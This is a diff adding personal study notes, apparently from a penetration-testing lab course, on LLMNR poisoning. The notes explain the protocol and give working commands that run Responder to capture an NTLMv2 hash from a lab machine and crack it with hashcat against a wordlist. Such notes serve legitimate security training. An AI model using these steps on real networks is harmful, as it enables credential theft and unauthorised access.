@@ -396,4 +396,52 @@ Scenario that we are going to simulate:
 =>
 	the idea is that -->  - the client laptop has been compromised
 					 - we are going to run different attacks
+ 
+#### LLMNR Poisoning
+Most common attack in -->  internal penetatrion test
+
+LLMNR = <span style="color:#00b050">Link Local Multicast Name Resolution</span> 
+         - protocol used to **identify hosts when DNS fails to do so****
+         - previously called NBT-NS
+
+Workflow attack:
+![[Pasted image 20240225102230.png]]
+the service uses:
+- username
+- hash                -->   when someone appropriately responded to
+  
+=>
+if we respond to the server in the right way =>    - the server will send us the username + hash
+                                         - we can try to decrypt the hash
+
+##### Responder
+we'll use the tool [[cheet#Responder|responder]] -->  to perform this attack
+=>
+`sudo python3 Responder.py -I vmnet8 -dwv`
+
+from THEPUNISHER:
+- login as fcastle with Password1
+- open file explorer
+- type in the bar -->  `\\ip attacker`
+=>
+<span style="color:#00b050">we have capture hash</span>
+![[Pasted image 20240225110349.png]]
+
+##### Crack the password
+save the hash inside a file called hash.txt =>  `echo fcastle::MARVEL:... > hash.txt`
+- we'll use [[cheet#hashcat]]
+- we have captured an -->  NTLMv2 hash
+  =>
+  we need to find the hashcat module for NTLMv2
+  =>
+- `hashcat --help | grep NTLM`![[Pasted image 20240225111403.png]]
+  =>
+  the module is -->  5600
+
+=>
+`hashcat -m 5600 hash.txt rockyou.txt`
+=>
+![[Pasted image 20240225112104.png]]
+<span style="color:#00b050">password found :)</span>
+
 
